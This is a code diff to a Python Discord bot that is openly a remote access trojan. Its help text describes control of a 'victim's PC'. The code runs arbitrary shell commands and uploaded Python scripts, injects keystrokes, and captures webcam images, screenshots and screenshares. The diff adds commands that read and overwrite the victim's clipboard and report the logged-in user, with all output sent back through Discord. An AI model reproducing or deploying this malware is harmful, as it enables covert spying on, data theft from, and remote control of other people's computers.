@@ -16,6 +16,7 @@ import psutil
 import platform
 import pyttsx3
 import cv2
+import pyperclip
 
 # Setup:
 intents = discord.Intents.default()
@@ -30,39 +31,39 @@ bot = commands.Bot(command_prefix='!', intents=intents)
 @bot.command()
 async def commands(ctx):
     print("Someone saw the commands.")
-    await ctx.send(
-    "> ## **Commands:**\n"
-    "> - `!commands` - tells you what commands you can type.\n"
-    "> - `!deepdive` - tells you what a command does.\n"
-    "> ### Control:\n"
-    "> - `!cmd` - allows you to use CMD on your victim's PC.\n"
-    "> - `!write` - allows you to type anything on the victim's keyboard.\n"
-    "> - `!openlink` - allows you to open a link in the victim's browser.\n"
-    "> - `!speak` - allows you to do TTS on your victim's PC.\n"
-    "> - `!popup` - allows you to create a custom window on the victims PC.\n"
-    "> - `!runscript` - allows you to run a python file on the victims PC.\n"
-    "> ### View:\n"
-    "> - `!systeminfo` - allows you to see your victim's system information.\n"
-    "> - `!webcam` - allows you to take a picture on the victims webcam.\n"
-    "> - `!screenshot` - allows you to take a screenshot on the victims PC.\n"
-    "> - `!screenshare` - allows you to screenshare the victims screen.\n"
-    "> ### Terminate:\n"
-    "> - `!shutdown` - shuts down the victims PC.\n"
-    "> - `!restart` - restarts the victims PC.\n"
-    )
+    await ctx.send("""
+> ## **Commands:**
+> - `!commands` - tells you what commands you can type.
+> - `!deepdive` - tells you what a command does.
+> ### Control:
+> - `!cmd` - allows you to use CMD on your victim's PC.
+> - `!write` - allows you to type anything on the victim's keyboard.
+> - `!openlink` - allows you to open a link in the victim's browser.
+> - `!setclip` - allows you to set what the clipboard is on victim's PC.
+> - `!speak` - allows you to do TTS on your victim's PC.
+> - `!popup` - allows you to create a custom window on the victims PC.
+> - `!runscript` - allows you to run a python file on the victims PC.
+> ### Observe:
+> - `!connected` - allows you to see your who are connected right now.
+> - `!systeminfo` - allows you to see your victim's system information.
+> - `!webcam` - allows you to take a picture on the victims webcam.
+> - `!screenshot` - allows you to take a screenshot on the victims PC.
+> - `!screenshare` - allows you to screenshare the victims screen.
+> - `!getclip` - allows you to see what the clipboard is.
+> ### Terminate:
+> - `!shutdown` - shuts down the victims PC.
+> - `!restart` - restarts the victims PC.
+""")
 
 @bot.command()
 async def deepdive(ctx, command=None):
     if command is None:
         await ctx.send("You need to say what command you want a deep dive on.")
-    elif command.lower() in ['commands', 'deepdive', 'cmd', 'write', 'openlink', 'speak', 'popup', 'runscript', 'systeminfo', 'webcam', 'screenshot', 'screenshare', 'shutdown', 'restart']:
-        print("Someone wants a deepdive on:", command)
     else:
-        print("error")
-        await ctx.send("error")
+        print("Someone wants a deepdive on:", command)
   
-    if command == "commands":
-        await ctx.send("""
+        if command == "commands":
+            await ctx.send("""
 --------------------------------------------------------------------
 ## ! COMMANDS
 
@@ -83,8 +84,8 @@ Please use these commands responsibly and in accordance with Discord's terms of 
 --------------------------------------------------------------------
 """)  
     
-    if command == "deepdive":
-        await ctx.send("""
+        elif command == "deepdive":
+            await ctx.send("""
 --------------------------------------------------------------------
 ## ! DEEPDIVE
 
@@ -105,8 +106,8 @@ Please use these commands responsibly and in accordance with Discord's terms of 
 --------------------------------------------------------------------
 """)      
   
-    if command == "cmd":
-        await ctx.send("""
+        elif command == "cmd":
+            await ctx.send("""
 --------------------------------------------------------------------
 ## ! CMD
 
@@ -117,18 +118,18 @@ This command allows the bot to execute shell commands provided by the user and r
 You can use this command by typing `!cmd` followed by the shell command you want to execute.
 
 **Example:**
-``!cmd ls -l``
+``!cmd ping google.com``
 
 **Category:**
-Command
+*Command*
 
 **Note:**
 Make sure to use this command responsibly and avoid running harmful or unauthorized commands.
 --------------------------------------------------------------------
 """)
 
-    if command == "write":
-        await ctx.send("""
+        elif command == "write":
+            await ctx.send("""
 --------------------------------------------------------------------
 ## ! write
 
@@ -142,7 +143,7 @@ You can use this command by typing `!write` followed by the text you want the bo
 ``!write Hello, Discord!``
 
 **Category:**
-Command
+*Command*
 
 **Note:**
 - The bot will simulate typing with a slight delay between characters (delay=0.05) to mimic human typing.
@@ -150,8 +151,8 @@ Command
 --------------------------------------------------------------------
 """)
 
-    if command == "openlink":
-        await ctx.send("""
+        elif command == "openlink":
+            await ctx.send("""
 --------------------------------------------------------------------
 ## ! OPENLINK
 
@@ -162,15 +163,15 @@ This command allows the bot to open a web link provided by the user.
 You can use this command by typing `!openlink` followed by the URL you want to open.
 
 **Category:**
-Command
+*Command*
 
 **Example:**
 ``!openlink https://www.example.com``
 --------------------------------------------------------------------
 """)
 
-    if command == "speak":
-        await ctx.send("""
+        elif command == "speak":
+            await ctx.send("""
 --------------------------------------------------------------------
 ## ! SPEAK
 
@@ -181,15 +182,15 @@ This command allows the bot to convert text into speech and say it.
 You can use this command by typing `!speak` followed by the text message you want the bot to say.
 
 **Category:**
-Command
+*Command*
 
 **Example:**
 ``!speak Hello, Discord!``
 --------------------------------------------------------------------
 """)
 
-    if command == "popup":
-        await ctx.send("""
+        elif command == "popup":
+            await ctx.send("""
 --------------------------------------------------------------------
 ## ! POPUP
 
@@ -203,15 +204,15 @@ You can use this command by typing `!popup` followed by the main text and the su
 ``!popup Important_Notification This is the subtext.``
 
 **Category:**
-Command
+*Command*
 
 **Note:**
 Be mindful of the content you display in the popup window.
 --------------------------------------------------------------------
 """)
 
-    if command == "runscript":
-        await ctx.send("""
+        elif command == "runscript":
+            await ctx.send("""
 --------------------------------------------------------------------
 ## ! RUNSCRIPT
 
@@ -225,7 +226,7 @@ You can use this command by typing `!runscript` and attaching a Python script fi
 ``!runscript (attach a Python script file)``
 
 **Category:**
-Command
+*Command*
 
 **Note:**
 - The bot will execute the script and display the output.
@@ -234,8 +235,8 @@ Command
 --------------------------------------------------------------------
 """)
 
-    if command == "systeminfo":
-        await ctx.send("""
+        elif command == "systeminfo":
+            await ctx.send("""
 --------------------------------------------------------------------
 ## ! SYSTEMINFO
 
@@ -249,7 +250,7 @@ You can use this command by typing `!systeminfo`.
 ``!systeminfo``
 
 **Category:**
-View
+*Observe*
 
 **Note:**
 - The bot will retrieve and display information about the host machine's operating system, CPU, memory, disk, and network interfaces.
@@ -257,8 +258,8 @@ View
 --------------------------------------------------------------------
 """)
 
-    if command == "webcam":
-        await ctx.send("""
+        elif command == "webcam":
+            await ctx.send("""
 --------------------------------------------------------------------
 ## ! WEBCAM
 
@@ -272,7 +273,7 @@ You can use this command by typing `!webcam`.
 ``!webcam``
 
 **Category:**
-View
+*Observe*
 
 **Note:**
 - The bot will capture an image from the webcam and send it as a JPG file.
@@ -280,8 +281,8 @@ View
 --------------------------------------------------------------------
 """)
 
-    if command == "screenshot":
-        await ctx.send("""
+        elif command == "screenshot":
+            await ctx.send("""
 --------------------------------------------------------------------
 ## ! SCREENSHOT
 
@@ -295,15 +296,15 @@ You can use this command by typing `!screenshot`.
 ``!screenshot``
 
 **Category:**
-View
+*Observe*
 
 **Note:**
 The bot will capture a screenshot and send it as a PNG file.
 --------------------------------------------------------------------
 """)
 
-    if command == "screenshare":
-        await ctx.send("""
+        elif command == "screenshare":
+            await ctx.send("""
 --------------------------------------------------------------------
 ## ! SCREENSHARE
 
@@ -317,7 +318,7 @@ You can use this command by typing `!screenshare [duration]` where `[duration]` 
 ``!screenshare 30``
 
 **Category:**
-View
+*Observe*
 
 **Note:**
 - The bot will capture and send screenshots at regular intervals for the specified duration.
@@ -325,8 +326,8 @@ View
 --------------------------------------------------------------------
 """)
 
-    if command == "shutdown":
-        await ctx.send("""
+        elif command == "shutdown":
+            await ctx.send("""
 --------------------------------------------------------------------
 ## ! SHUTDOWN
 
@@ -340,15 +341,15 @@ You can use this command by typing `!shutdown`.
 ``!shutdown``
 
 **Category:**
-Terminate
+*Terminate*
 
 **Note:**
 Use it with caution, as it will shut down the bot.
 --------------------------------------------------------------------
 """)
 
-    if command == "restart":
-        await ctx.send("""
+        elif command == "restart":
+            await ctx.send("""
 --------------------------------------------------------------------
 ## ! RESTART
 
@@ -362,7 +363,7 @@ You can use this command by typing `!restart`.
 ``!restart``
 
 **Category:**
-Terminate
+*Terminate*
 
 **Note:**
 Use it with caution, as it will shut down the bot.
@@ -431,13 +432,23 @@ async def openlink(ctx, url=None):
     webbrowser.open(url)
 
 @bot.command()
+async def setclip(ctx, *, clip=None):
+    if clip is None:
+        await ctx.send("You need to say what you want to set the clipboard to.")
+    else:
+        print("Set the cliboard to: ", clip)
+        await ctx.send("Set the cliboard to: " + clip)
+        pyperclip.copy(clip)
+
+@bot.command()
 async def speak(ctx, *, message=None):
     if message is None:
         await ctx.send("You need to provide something for the TTS to read out.")
-    print("Saying: ", message)
-    await ctx.send("Saying: " + message)
-    engine.say(message)
-    engine.runAndWait()
+    else:
+        print("Saying: ", message)
+        await ctx.send("Saying: " + message)
+        engine.say(message)
+        engine.runAndWait()
 
 @bot.command()
 async def popup(ctx, text_main="Window", *, text_sub="Hello there!"):
@@ -494,7 +505,13 @@ async def runscript(ctx):
             print("Ran python file")
             await ctx.send("Python output is too long to display. Here's a text file:", file=discord.File(file, 'python_output.txt'))
 
-# View:
+# Observe:
+@bot.command()
+async def connected(ctx):
+    username = getpass.getuser()
+    print("User: ", username, "connected")
+    await ctx.send(username)
+
 @bot.command()
 async def systeminfo(ctx):
     username = getpass.getuser()
@@ -540,11 +557,11 @@ async def systeminfo(ctx):
         print("Printed system info: ", username)
         await ctx.send(operating_system_info)
     else:
-        with open('system_info', username, '.txt', 'w') as file:
+        with open('system_info.txt', 'w') as file:
             file.write(operating_system_info)
-        with open('system_info', username, '.txt', 'rb') as file:
+        with open('system_info.txt', 'rb') as file:
             print("Printed system info: ", username)
-            await ctx.send("System information is too long to display. Here's a text file:", file=discord.File(file, 'system_info', username, '.txt'))
+            await ctx.send("System information is too long to display. Here's a text file:", file=discord.File(file, 'system_info.txt'))
 
 @bot.command()
 async def webcam(ctx):
@@ -596,6 +613,12 @@ async def screenshare(ctx, how_long: int = 15):
 
         await ctx.send(file=discord.File(buffer, filename='screenshot.png'))
 
+@bot.command()
+async def getclip(ctx):
+    clipboard_text = pyperclip.paste()
+    print("Clipboard text: ", clipboard_text)
+    await ctx.send(clipboard_text)
+
 # Terminate:
 @bot.command()
 async def shutdown(ctx):
@@ -614,4 +637,4 @@ async def restart(ctx):
 async def on_ready():
     print(f'Logged in as {bot.user.name}')
 
-bot.run('YOUR_TOKEN_HERE')
+bot.run('YOUR_BOT_TOKEN')
